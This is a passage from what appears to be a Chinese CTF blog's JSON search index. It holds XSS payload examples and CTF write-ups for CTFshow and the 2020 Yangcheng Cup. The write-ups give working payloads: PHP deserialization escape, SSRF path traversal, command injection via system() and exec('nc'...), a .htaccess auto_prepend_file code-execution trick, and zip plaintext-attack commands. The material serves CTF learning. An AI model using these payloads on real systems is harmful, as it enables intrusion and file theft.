onloadstart=&quot;alert(1)&quot;&gt;&lt;details/open/ontoggle=&quot;alert`1`&quot;&gt;&lt;audio src onloadstart=alert(1)&gt;&lt;marquee onstart=alert(1)&gt;&lt;meter value=2 min=0 max=10 onmouseover=alert(1)&gt;2 out of 10&lt;/meter&gt; ​ 绕过 JSfuck加密 &lt;script&gt;[JSfuck Code...]&lt;/script&gt; Base64 &lt;script&gt;eval(atob(&quot;[Base64 Code...]&quot;))&lt;/script&gt; ​ CSPCSP（内容安全策略） 的主要目标是减少和报告 XSS 攻击 ，XSS 攻击利用了浏览器对于从服务器所获取的内容的信任。恶意脚本在受害者的浏览器中得以运行，因为浏览器信任其内容来源，即使有的时候这些脚本并非来自于它本该来的地方。 CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)。 作为一种终极防护形式，始终不允许执行脚本的站点可以选择全面禁止脚本执行。 &lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot;&gt;","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://lazzzaro.github.io/tags/XSS/"}],"author":"Lazzaro"},{"title":"CTFshow 月饼杯","slug":"match-CTFshow-月饼杯","date":"2020-09-26T14:12:43.000Z","updated":"2020-09-29T12:25:47.035Z","comments":true,"path":"2020/09/26/match-CTFshow-月饼杯/","permalink":"https://lazzzaro.github.io/2020/09/26/match-CTFshow-%E6%9C%88%E9%A5%BC%E6%9D%AF/","excerpt":"","text":"​ 比赛：CTFshow 月饼杯 平台：https://ctf.show开始：2020/9/25 18:00结束：2020/9/27 18:00题目： web 杂项 密码 逆向 pwn 若干道规则：1 比赛期间可以随意讨论，wp须在比赛结束后发布，wp统一发布地址：https://wp.ctf.show2 公平竞技，独立比赛3 服务器不要爆破，不要攻击服务器，不要扫描!!!4 奖品：rank最高的师傅发月饼！rank最高的师傅发月饼！rank最高的师傅发月饼！ 出题：crypto1+crypto2+crypto3+misc1 ​ WEBweb1_此夜圆 一江春水何年尽，万古清光此夜圆 index.php 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;yu22x&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125;&#125;function filter($string)&#123; return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; 反序列化字符逃逸。 正常序列化： 1234$uname=&#x27;FirebaskyFirebasky&#x27;;$password=&#x27;1&#x27;;$x=new a($uname,$password);echo serialize($x); 得到 O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:18:&quot;FirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; filter()函数会把其中的Firebasky替换为Firebaskyup，而字符串对应的长度值不变，即 O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:18:&quot;FirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; 在unserialize()反序列化时，字符长度与原始值不一致会反序列化失败，尝试把多出来的部分构造为需要的password值，既保证反序列化正常执行，又能将原始无用的后半部分“挤出去”。 构造&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;（长度：30） 即 1234$uname=&#x27;FirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&#x27;;$password=&#x27;1&#x27;;$x=new a($uname,$password);echo serialize($x); filter()函数替换后得到 O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:48:&quot;FirebaskyupFirebaskyup&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;&#125; 由于FirebaskyupFirebaskyup不足48长度，反序列化失败，可以增加构造的Firebasky，假设要构造 $x$ 个Firebasky，则有 $9x+30=(9+2)x$，解得 $x=15$。 PAYLOAD: ?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; ​ web2_故人心 三五夜中新月色，二千里外故人心 Hint: 存在一个robots.txt 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);highlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];$c=$_GET[&#x27;c&#x27;];$url[1]=$_POST[&#x27;url&#x27;];if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123; $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c))); if($d)&#123; highlight_file(&#x27;hint.php&#x27;); if(filter_var($url[1],FILTER_VALIDATE_URL))&#123; $host=parse_url($url[1]); print_r($host); if(preg_match(&#x27;/ctfshow\\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123; print_r(file_get_contents($url[1])); &#125;else&#123; echo &#x27;差点点就成功了！&#x27;; &#125; &#125;else&#123; echo &#x27;please give me url!!!&#x27;; &#125; &#125;else&#123; echo &#x27;想一想md5碰撞原理吧?!&#x27;; &#125;&#125;else&#123; echo &#x27;第一个都过不了还想要flag呀?!&#x27;;&#125; 三层绕过。 第一层 is_numeric()函数限定a必须为数字，可用字符：0123456789e.+-， strlen()函数限定a在7个字符内，同时又要满足a!=0和a*a=0， 考虑到PHP浮点数精度溢出，构造a接近于0，且足够小的数，如xe-xxx的形式， 开始尝试构造a=9e-999失败，因过小导致a=0，缩小小数位使a不溢出且a*a溢出，a=9e-199成功。 第二层 纯爆破头爆炸都无果，谁能想到代码类web题会有robots.txt？ Is it particularly difficult to break MD2?!I’ll tell you quietly that I saw the payoad of the author.But the numbers are not clear.have fun~~~~xxxxx024452 hash(&quot;md2&quot;,$b)xxxxxx48399 hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b)) 有了hint好办许多，考虑PHP中的弱类型比较，对于0e开头且后部分纯数字的字符串作0看，爆： 12345678910111213141516171819202122from Crypto.Hash import MD2for i in range(1000): h = MD2.new() h.update(b&#x27;0e&#x27;+str(i).zfill(3).encode()+b&#x27;024452&#x27;) x=h.hexdigest() if x.startswith(&#x27;0e&#x27;) and x[2:].isdigit(): print(i)print() for i in range(10000): h = MD2.new() h.update(b&#x27;0e&#x27;+str(i).zfill(4).encode()+b&#x27;48399&#x27;) x=h.hexdigest() k = MD2.new() k.update(x.encode()) xx=k.hexdigest() if xx.startswith(&#x27;0e&#x27;) and xx[2:].isdigit(): print(i)#652#6034 得到b=0e652024452&amp;c=0e603448399 第三层 过两层得到hint：$flag=&quot;flag in /fl0g.txt&quot;; ssrf绕过。filter_var函数可以解析多种协议，试试不是http的协议： url=0://ctfshow.com 可以成功得到host值绕过filter_var和preg_match函数。 parse_url函数用来解析URL，并把URL分割成特定的部分，在payload后构造路径可以成功将路径写入path值： url=0://ctfshow.com/../../../../../fl0g.txt ​ web3_莫负婵娟 皎洁一年惟此夜，莫教容易负婵娟 Hint: 环境变量 +linux字符串截取 + 通配符 Hint放出前，利用通配符_爆出了密码，登录后不知下步。 过滤了&#39;和(，没想到绕过binary的方法。 纯粹不会，仅是留坑。 补充：全程在想怎么绕过binary，没注意密码位数…. 解法参考月饼王师傅wp。 ​ MISCmisc1_共婵娟 但愿人长久，千里共婵娟 MISC之王争夺战！ 两密一一对应，填入神秘代码 Hint1: 神秘代码中有东西缺失，填补后开阔思维， / 仅是分隔线 Hint2: https://pan.baidu.com/ Hint3: 最后一步：y=ax+b 【预留待写】 ​ misc2_洗寰瀛 天将今夜月，一遍洗寰瀛 来自神秘力量的入侵，掌握核心秘密 https://ctfshow.lanzous.com/iDybQgvymsb Hint1: 步骤1预计时间为50分钟 Hint2: zip明文攻击 Hint3: https://github.com/kimci86/bkcrack/blob/master/example/tutorial.md Hint4: flag[0:9]==’flag{TriG’，可能字体文件有问题 原理： 明文攻击顾名思义我们需要知道解密后的内容来反推密钥。所以不是什么Zip压缩包拿来都可以完全只通过处理密文破解，需要做一些分析。 Biham和Kocher在1994年提出了一种针对ZipCrypto的明文攻击 ，仅需12字节的明文信息就可以运行该算法。该算法得到的是ZipCrypto内部的密钥，所以和密码复杂度无关。只有12字节时，复杂度是 $2^{40}$，多提供一字节就去掉不少可能性。 Stay提出了新的一种明文攻击方法，只需要4个明文字节，复杂度为 $2^{63}$，但是可以使用多个文件大幅降低复杂度。Jeong有一些对BK94的改进，他们也使用了同一压缩包内的更多的文件。因为明文的推断常常是看文件头的，所以使用更多文件有一定的合理性。Stay还发现了Winzip的随机数生成漏洞，可以在没有任何明文的情况下使用5个同一压缩包的密文文件，以 $2^{39}$ 复杂度破解（2002年的文章，Winzip我猜肯定已经修复了）。 但是不管怎么样，明文总是需要的，有了十几字节的明文（不一定要在文件头，但是需要知道偏移地址）用BK94破解就非常可行了。事实上我感觉获取十几字节明文的难度和4字节差别不大，所以最主要的还是考虑BK94方法。最大的问题在于怎么获得明文。文件头很好猜，大多数文件十几个字节的文件头还是比较固定的。麻烦的是Zip先压缩后加密，明文是经过压缩处理的。很久以前，Zip是用Implode压缩，压缩后的内容是比较容易确定的，这大概也就是Biham在文章里说有200字节未压缩的明文就够了的原因。现在Zip都是用Deflate压缩，Deflate是已经标准化的压缩格式，先运行LZ77，再运行哈夫曼编码器 。Deflate采用动态哈夫曼编码的时候，将文件分为不同的块，每块最长为64KB。哈夫曼树在每一个块的前部，所以如果有文件头部的64KB，那大概可以算出压缩后的明文（还得考虑压缩参数）。Deflate压出来的文件熵是很高的，需要整个块的信息才有可能推出哈夫曼树，这使得明文攻击的难度大大提升。 虽然猜测明文难度因Deflate的使用大大提高，但是也不是不可能的，关键在于一些格式本来就已经压缩过了，Deflate压不动了，放弃了治疗，基本保留了原文。 BK94的方法实现网上有现成的，有见到比较多的PKCrack。这个软件2003年的，有点老了，还必须提供整个明文文件（这种是用于一个大的压缩包里有小的文件互联网上找得到的）。所以这里我推荐另外一个github上叫kimci86老哥写的版本，这位老哥写的性能好，C++代码漂亮，重要的是提供了偏移选项，用起来更灵活。具体使用方法参见他仓库里的example/tutorial.md。 参考：https://zhuanlan.zhihu.com/p/129855130 结合Hint2和Hint3，使用bkcrack工具照步骤复现即可。 查看压缩文件信息：unzip -Z Triglavian.zip 获取CRC值：unzip -Z -v Triglavian.zip Triglavian.png | grep CRC（2c810480） 生成明文部分文件：echo -n -e &#39;\\x2c\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a\\x00\\x00\\x00\\x0d\\x49\\x48\\x44\\x52&#39; &gt; header.txt 明文攻击：./bkcrack -C Triglavian.zip -c Triglavian.png -p header.txt -o -1 约20+min得到密钥：be056038 a143c0c 1ea08ca5 还原出原文件：./bkcrack -C Triglavian.zip -c Triglavian.png -k be056038 a143c0c 1ea08ca5 -d Triglavian.png 奇怪的编码肯定是flag，用关键字“Triglavian 密码”知为深渊三神裔字体(Triglavian fonts)，也叫特格拉文，对照密码表解码（修改其中的g为G）。 参考： http://eve.netease.com/forum.php?mod=viewthread&amp;tid=6742 https://www.ackurdeeve.com/201902/triglavianfonts/ ​ 附加misc_问青天 明月几时有，拿饼问青天 密码为你听到的一句话 稍微有点难度 根据现实改编 东施效颦而已 附件：welcome.zip Hint1: gif图片中两个字母o代表氢原子的能级，当氢原子的电子发生能级跃迁时，间隔为10亿分之7秒 Hint2: 小姐姐声音是aiff格式 分离gif图片，得到两帧对应的bmp图片， 16进制查看gif文件，结合Hint2，可以分离出1个jpg图片文件+1个aiff音频文件+1个加密zip文件。 bmp图片和jpg图片均有特殊符号，暂不知用处。 播放aiff音频，将速度调慢，得到内容“欢迎ctfshow的小哥哥来玩”，可解密zip文件，得到1个png图片文件。、 尝试长换1短换0，二进制转换字符，发现就是flag。 原来Hint1和bmp+jpg图片都是虚晃一枪，辛苦群主PS了啊… ​ CRYPTOcrypto1_中秋月 此夜中秋月，清光十万家 自动钥匙⊕ 明文全大写，得到后转小写，并以_连接单词。 格式：flag{xxx}。 Hint1: 某古典密码 Hint2: 经此古典密码加密后，密文还是大写 Hint3: 该古典密码的密钥形式：keyword+plaintext (+plaintext…+plaintext) （内容部分引用月饼王师傅wp 懒…） Autokey密码+异或操作。 先爆破得到异或结果： 123456789s=&#x27;fsskryenvkm~jl&#123;ejs&#125;jwflzsnpgmifq&#123;&#123;j&#123;|suhzrjppnx|qvixt~whu&#x27;for i in range(255): res=&#x27;&#x27; for j in range(0,len(s)): temp = ord(s[j])^i if 65&lt;=temp&lt;=90 or 97&lt;=temp&lt;=122: #由大小写字母构成 res += (chr(temp)) if len(res)==len(s): print(res) 结合Hint2，发现全大写字符串：YLLTMFZQITRAUSDZULBUHYSELQOXRVYNDDUDCLJWEMUOOQGCNIVGKAHWJ。 再上Autokey爆破脚本，得key：KEYFORFLAG，明文：OHNOYOUFINDTHEFLAGTHEFLAGFORYOUISDOYOULIKECLASSICALCIPHER ​ crypto2_月自圆 世远人何在？天空月自圆。 Baby (Don’t) Cry （内容部分引用月饼王师傅wp 懒…） 明文长度为71位，加密后为142位。这里由于a不大，salt长度也不长，且明文m中存在flag，正好可以用这几位去爆破出a和salt。flag在明文m中的位置是53，对应密文c中的位置是105。flag出现的位置正好对应salt的位置。 写脚本爆出a和salt： 1234567891011121314151617181920212223242526272829303132333435363738394041import stringlower = string.printable[10:36]x0=set()y0=dict()for a in range(50,101): for s0 in lower: if hex((102*a+ord(s0)) % 128) == &#x27;0x1c&#x27;: x0.add(a) y0[a]=s0x1=set()y1=dict()for a in range(50,101): for s1 in lower: if hex((108*a+ord(s1)) % 128) == &#x27;0x29&#x27;: x1.add(a) y1[a]=s1x2=set()y2=dict()for a in range(50,101): for s2 in lower: if hex((97*a+ord(s2)) % 128) == &#x27;0x56&#x27;: x2.add(a) y2[a]=s2 x3=set()y3=dict()for a in range(50,101): for s3 in lower: if hex((103*a+ord(s3)) % 128) == &#x27;0x66&#x27;: x3.add(a) y3[a]=s3a=(x0&amp;x1&amp;x2&amp;x3).pop()print(a)print(y0[a])print(y1[a])print(y2[a])print(y3[a]) 得到后，解密： 12345678910111213141516a = 67si=b&#x27;jesq&#x27;si=list(si)print(si)c = &#x27;3472184e657e50561c481f5c1c4e1938163e154431015e13062c1b073d4e3a444f4a5c5c7a071919167b034e1c29566647600c4e1c2956661b6c1f50622f0016317e563546202a&#x27;cc=list()for i in range(len(c)//2): cc.append(int(c[2*i:2*i+2],16))print(cc)flag=&#x27;&#x27;for i in range(len(cc)): for m in range(0,127): if (m*a+si[i%4])%128 == cc[i]: flag+=chr(m)print(flag) ​ crypto3_多少离怀 多少离怀起清夜，人间重望一回圆。 Weird Γ(x)? Hint1: 注意伽马函数Γ(x)和阶乘x!的关系式 Hint2: 威尔逊定理 （内容部分引用月饼王师傅wp 懒…） 我们需要求gamma(B+2)%A，根据伽马函数Γ(x)和阶乘x!的关系式可知(B+1)! % A。而根据威尔逊定理可知(A-2)! % A = 1。令x = (A-2)!/(B+1)!，y = (B+1)!，所以x * y ≡ 1 (mod A)。而我们需要求的是y % A，y是x关于A的逆元。所以求x % A的逆元即可。这里由于A、B相差还不到10万，所以很容易求解出x % A。 12345678910111213141516171819202122232425262728293031from Crypto.Util.number import getPrime,isPrimeimport gmpy2def nextPrime(n): n += 2 if n &amp; 1 else 1 while not isPrime(n): n += 2 return n def factorial_mod(A,B): ans = 1 tmp = pow(-1,1,A) for i in range(B+1,A): ans = (ans*gmpy2.invert(i,A))%A return (ans*tmp)%A pA = 6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723982789pB = 6814157460586876042804041951834304833424062437744287469257313954502540797027261340622077218188033865281590529907571701131297782609357118357982463723922147qA = 7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477881291qB = 7145646366857234331692232566211321498245533826533958883943688415057871253511271731661019642050252046201115975396366275083424623329930477623781348477807457n = 4451906216583258787166698210560165433649728830889954633721198623488802305844782492171757604711145165920462286487680020347239300947225371917344589502941576734875830871998499135120227347066586066943289430156378296665669974728569678779668142712266780949126509440672273927433367293606776081254094682033167575930701870261219046464773708974194213798032346187463443317770758989273370488582862531630356263732232300508706676725203199729764016766683870925164232508407363688370458877688991733322055785233669885166225464068579486683574954699370175267031949720967812902215635630884502987094547523361027411501285252862476410213277925430392164226297316310465146003494714018456407793759170649913180823814850170639706664167149612984905056804131124522209409607977589884632999710708045656852149371030046919242039957767777840304466948549383597755811307383659188216421501912831203089570725388153416013596114462069777713822433178099904907224119c = 1996198968748552041728429851810599627895157160099076033250854211280074825148767841655949210593646824507865483166496070951130337321360509148527292165245205219296211294789087358959553387392928560150390604911087085313000622842025416521494799132969818997182731021267942464323979261593380113740152841984062184326431879167516288834455296913822921806893572566867611541664848820247889274979245086440402996661226884320574824077910315143756471444347386795428338020162169391827182914043434253974549636668126789355991920452920806351939782281969098470635517019120996509180703896707990501216102290302162705699788457579330150149320348175742131887213742989509004374645723471497302400169849858253644606818874098604333865973357374444445825761600866472906771935670261641342221394488068630591190697667016958881530367047928341661857241378511420562236766886349565409774340321441504290366223243635878057759623855735794209219474650425139791831374e = 0x10001p = nextPrime(factorial_mod(pA,pB+1))q = nextPrime(factorial_mod(qA,qB+1))r=gmpy2.iroot(n//(p*q*q),3)[0]phi=(p-1)*q*(q-1)*r*r*(r-1)d=gmpy2.invert(e,phi)flag=gmpy2.powmod(c,d,n)import binasciiprint(binascii.unhexlify(hex(flag)[2:])) ​ REVERSEre1_西北望乡 西北望乡何处是，东南见月几回圆。 附件：re IDA反编译，main函数中关键代码： 代码逻辑： flag长度45，取flag的第3、6、13、36个字符值及13共五个数作为key，假设为 $k_0,k_1,k_2,k_3,k_4$； 第一个for循环分别计算 $k_4^5,k_3^4,k_2^3,k_1^2,k_0^1$，存入b数组：$b_0,b_1,b_2,b_3,b_4=k_4^5,k_3^4,k_2^3,k_1^2,k_0^1$； 第二个for循环将flag分为9组，每组5个字符，对每组字符，假设该组字符为 $c_0,c_1,c_2,c_3,c_4$，计算 $\\sum=c_0b_0+c_1b_1+c_2b_2+c_3b_3+c_4b_4=c_0k_4^5+c_1k_3^4+c_2k_2^3+c_3k_1^2+c_4k_0$ 最后判断9个求和得到的值是否与arr数组相等。 由于flag前五字符为flag&#123;，即为第1组， 有k0=ord(&#39;g&#39;)，又k4已知，可以爆破key中的 k1、k2和k3值： 1234567891011121314import stringdic=string.ascii_lowercase+&#x27;_&#x27;arr=[11377526307,11291274669,10667335421,12105207237,12005384512,10853488462,12005544354,10651566902,5399147315,11333307]for x in dic: for y in dic: for z in dic: k=ord(&#x27;f&#x27;)*(13**5)+ord(&#x27;l&#x27;)*(ord(x)**4)+ord(&#x27;a&#x27;)*(ord(y)**3)+ord(&#x27;g&#x27;)*(ord(z)**2)+ord(&#x27;&#123;&#x27;)*ord(&#x27;g&#x27;) if k==arr[0]: print(x,y,z)#101 101 107#x=k3=101#y=k2=101#z=k1=107 故 key=[103,107,101,101,13] 照葫芦画瓢，对剩下8组每组分别爆破即可： （纯小写字母+_情况下最后一组无结果，增加数字） 12345678910111213141516171819202122232425262728293031323334import stringdic=string.ascii_lowercase+&#x27;_&#x27;key=[103,107,101,101,13]arr=[11377526307,11291274669,10667335421,12105207237,12005384512,10853488462,12005544354,10651566902,5399147315,11333307]def bruteforce_mid(val): for a in dic: for b in dic: for c in dic: for d in dic: for e in dic: sum=ord(a)*(key[4]**5)+ord(b)*(key[3]**4)+ord(c)*(key[2]**3)+ord(d)*(key[1]**2)+ord(e)*key[0] if sum==val: return a+b+c+d+e def bruteforce_last(val): dic=dic=string.ascii_lowercase+string.digits+&#x27;_&#x27; for a in dic: for b in dic: for c in dic: for d in dic: sum=ord(a)*(key[4]**5)+ord(b)*(key[3]**4)+ord(c)*(key[2]**3)+ord(d)*(key[1]**2)+ord(&#x27;&#125;&#x27;)*key[0] if sum==val: return a+b+c+d+&#x27;&#125;&#x27;flag=&#x27;flag&#123;&#x27;for i in range(1,8): flag+=bruteforce_mid(arr[i]) print(flag)flag+=bruteforce_last(arr[8])print(flag)#flag&#123;okok_here_is_your_flag_where_are_my_36d&#125; ​ re2_归心 满月飞明镜，归心折大刀 你应该见过python代码打包成的exe，猜猜这是什么语言 附件：readme.zip 拖入IDA查看字符串，发现java.exe/openjdk/jre字样，猜测为java打包成的jar转的exe文件。 jar转exe大多使用exe4j工具，exe4j只是将java程序，使用自己的方式打包了一下而已，所以运行的时候还是会转成jar来运行，而jar文件必定存储在本地的固定位置。所以反编译的步骤如下： 运行exe程序； 到C盘搜索readme.jar，找到它及其依赖jar包（用Everything可快速搜索）； 使用jd-gui反编译readme.jar，查看源码找到flag。 ​ re3_若无月 此夜若无月，一年虚过秋 misc2后续故事你所看到的，是一个被神秘力量入侵的屏幕flag格式为flag/your_flag/ Hint1: base64 is trap Hint2: 预期解法hint:魔改RC4认可的非预期解法hint:1/192几率直接显示flag 赛后对照着RC4算法啃做出。 IDA-F5找到关键字“Triglavian”+一串类似base64密文+一串类似base64码表，跟进关键字进入sub_401360函数，在case 1u内找到关键代码： 对照标准RC4算法： RC4算法包括初始化算法（KSA）和伪随机子密码生成算法（PRGA）两大部分。(RC4 algorithm including initialization algorithm (KSA) and pseudo-random sub-password generation algorithm (PRGA) two parts.) 1234567891011121314151617181920212223242526272829303132333435363738394041def KSA(key): keylength = len(key) S = range(256) j = 0 for i in range(256): j = (j + S[i] + key[i % keylength]) % 256 S[i], S[j] = S[j], S[i] # swap return Sdef PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] # swap K = S[(S[i] + S[j]) % 256] yield Kdef RC4(key): S = KSA(key) return PRGA(S)if __name__ == &#x27;__main__&#x27;: key = &#x27;Key&#x27; plaintext = &#x27;Plaintext&#x27; def convert_key(s): return [ord(c) for c in s] key = convert_key(key) keystream = RC4(key) import sys for c in plaintext: sys.stdout.write(&quot;%02X&quot; % (ord(c) ^ keystream.next())) print sub_401360函数中实现了KSA部分，可以发现改动了初始key数组（使用的newkey数组为aTriglavian变量中各字母对应码表的下标值，而非简单的字母对应ASCII值）和数组大小（使用64，非256）。 再往下看未发现PRGA部分，回到汇编代码文本视图，全局搜索S[，发现另一个函数sub_401160也存在： 跟进sub_501160函数，发现RC4算法的PRGA部分： 可以发现最后的异或部分，选取密文中每个字母，得到对应码表的下标值k，与标准生成的密钥流S[(S[i] + S[j]) % 64]异或后得到新下标值，替换成码表中对应的字母。由于RC4的对称性，结果即为明文。 魔改RC4解密脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152key = &#x27;Triglavian&#x27;lenk = len(key)cipher = &#x27;20c1LOP2FnBOCMhPbCdtXTHmpgoK7g1sPN0KCcaBs3sWx/5Bob1t6IJaahW6SUGpTW11DmhJGeTj3UCSPCOZYaLw9qmg80kN56XF+dNhBYlfKbWqwSKJl+zTBvH0yBLDy7nwJ1W/SeBW+LaUV1Dq4FRnogzD5FOHNknyfyMerA3o5lgRq03f2M5C7ixuJ6WK&#x27;dict = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;newkey = [-1]*64def KSA(key): S = list(range(64)) j = 0 for i in range(64): j = (j + S[i] + newkey[i]) % 64 S[i], S[j] = S[j], S[i] # swap return Sdef PRGA(S): i = 0 j = 0 while True: i = (i + 1) % 64 j = (j + S[i]) % 64 S[i], S[j] = S[j], S[i] # swap K = S[(S[i] + S[j]) % 64] yield Kdef RC4(key): S = KSA(key) return PRGA(S)if __name__ == &#x27;__main__&#x27;: i = 0 while 1: j = 0 while key[i%lenk] != dict[j]: j += 1 if j &gt;= 64: break newkey[i] = j i += 1 if i &gt;= 64: break print(newkey) #newkey = [19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32, 37, 26, 47, 34, 26, 39, 19, 43, 34, 32] keystream = RC4(newkey) flag = &#x27;&#x27; for c in cipher: flag += dict[dict.find(c) ^ keystream.__next__()] print(flag) ​ PWNpwn_天涯共此时 海上生明月，天涯共此时 附件：pwn.zip 纯粹不会，仅是留坑。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020赛","slug":"2020赛","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2020年羊城杯网络安全大赛","slug":"match-2020年羊城杯网络安全大赛","date":"2020-09-10T15:56:20.000Z","updated":"2020-09-11T15:07:37.611Z","comments":true,"path":"2020/09/10/match-2020年羊城杯网络安全大赛/","permalink":"https://lazzzaro.github.io/2020/09/10/match-2020%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"","text":"​ WEBeasycon 一窝蚂蚁大概有500-2000只，而梵蒂冈只有800人，如果这窝蚂蚁入侵梵蒂冈，他们要提着菜刀才能解决这群蚂蚁，但是你并不关心你只关心你自己 183.129.189.60:10021 御剑扫描出index.php页面，访问提示eval post cmd， POST传参cmd=system(&quot;ls -al&quot;);发现当前目录下有文件bbbbbbbbb.txt： 回到页面访问，得到一串base64图片后缀字符串，加上base64头data:image/png;base64,，在URL访问得到图片中显示的flag： flag: GWHT{do_u_kn0w_c@idao} ​ BlackCat 眼睛瞪得像铜铃 183.129.189.60:10022 查看源码发现提示都说听听歌了！，下载mp3文件查看16进制，发现最后有关键源码： 1234567891011121314151617if(empty($_POST[&#x27;Black-Cat-Sheriff&#x27;]) || empty($_POST[&#x27;One-ear&#x27;]))&#123; die(&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;);&#125;$clandestine = getenv(&quot;clandestine&quot;);if(isset($_POST[&#x27;White-cat-monitor&#x27;])) $clandestine = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;White-cat-monitor&#x27;], $clandestine);$hh = hash_hmac(&#x27;sha256&#x27;, $_POST[&#x27;One-ear&#x27;], $clandestine);if($hh !== $_POST[&#x27;Black-Cat-Sheriff&#x27;])&#123; die(&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;);&#125;echo exec(&quot;nc&quot;.$_POST[&#x27;One-ear&#x27;]); 需传入三个参数Black-Cat-Sheriff，One-ear，White-cat-monitor，用环境变量clandestine的值作为key对White-cat-monitor值进行sha256哈希运算，得到的结果再作为key用来对One-ear值进行sha256哈希运算，结果与Black-Cat-Sheriff相等则成功执行命令。 利用hash_hmac函数传入数组返回false的缺陷： 12$hmac = hash_hmac(&#x27;sha256&#x27;, Array(), &quot;SecretKey&quot;);echo $hmac == false; 传入数组返回false，再次运算时则无需key即可直接得到sha256哈希运算值。 通过修改One-ear命令及对应的Black-Cat-Sheriff值，最后拿到flag。 payload: White-cat-monitor[]=&amp;One-ear=;cat flag.php&amp;Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6 flag: GWHT{y0u_mu3t_p@y_atTentiou_!0_lt} 参考：SPOT THE BUG CHALLENGE 2018 WARM-UP ​ easyphp Easyphp 183.129.189.60:10023 题目逻辑： 访问时清除目录下除index.php文件外的其他文件，且只能写一次；另外限制字符为a-z和.，只有index.php文件解析， 考虑写入.htaccess文件，拆开关键字用\\换行以绕过正则过滤，利用 php_value auto_prepend_file .htaccess 让php文件包含.htaccess文件，从而执行代码： 12345678import requestsurl = &#x27;http://183.129.189.60:10023/sandbox/74adfb351cd5c3621c62d62e0785f24c/&#x27;payload = &#x27;?filename=.htaccess&amp;content=php_value%20auto_prepend_fi\\\\%0Ale%20&quot;.htaccess&quot;\\n%23&lt;?php system(\\&#x27;tac /fl&quot;a&quot;g\\&#x27;);?&gt;\\\\&#x27;url2 = url + payloadr = requests.get(url2)req = requests.get(url)print(req.content) flag: GWHT{easyApache} 参考：2019Xnuca Ezphp ​ MISCcom 老知识？ nc ip port 183.129.189.60:10028 nc，选择[1] Sign in得到多行多列数字，每行最后一个数字很大，易知为求解线性方程组。 调整好list格式，导出A和B矩阵： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546s = &#x27;&#x27;&#x27;352 971 218 64 892 633 999 122 123 792 727 822 719 16 780 261 264 317 721 957 517 1017 991 348 394 869 320 766 717 667 731 58 413 64 955 85069331023 635 210 93 822 102 584 905 79 257 259 482 662 323 833 503 270 393 411 7 879 918 905 336 822 905 204 190 651 653 899 333 266 750 755 8980959309 516 404 568 599 827 371 594 332 849 596 773 39 962 860 258 669 430 439 803 720 27 349 727 637 587 806 441 668 803 82 446 959 14 504 8846004740 858 936 187 273 53 28 758 934 228 465 549 809 582 854 404 705 